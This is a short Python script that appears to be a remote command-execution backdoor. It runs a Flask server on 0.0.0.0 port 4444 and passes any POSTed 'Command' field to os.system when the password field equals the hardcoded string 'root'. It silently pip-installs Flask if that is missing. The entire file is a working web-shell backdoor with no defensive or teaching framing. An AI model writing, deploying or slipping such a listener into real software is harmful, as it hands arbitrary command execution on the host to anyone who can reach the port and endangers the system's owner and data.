import os
try:
    from flask import Flask,request,Response
except:
    os.system('pip install flask')
    from flask import Flask,request,Response
app = Flask(__name__)
@app.route("/",methods=['POST'])
def index():
    if (request.method=="POST"):
        command,password = request.form.get("Command"),request.form.get("Password")
        if(password=="root"):
            if(command=="EXIT"):
                exit(1)
            return Response(str(os.system(command)), status=200, mimetype='text/html')
        return Response("", status=401, mimetype='text/html')
app.run(host="0.0.0.0",port=4444)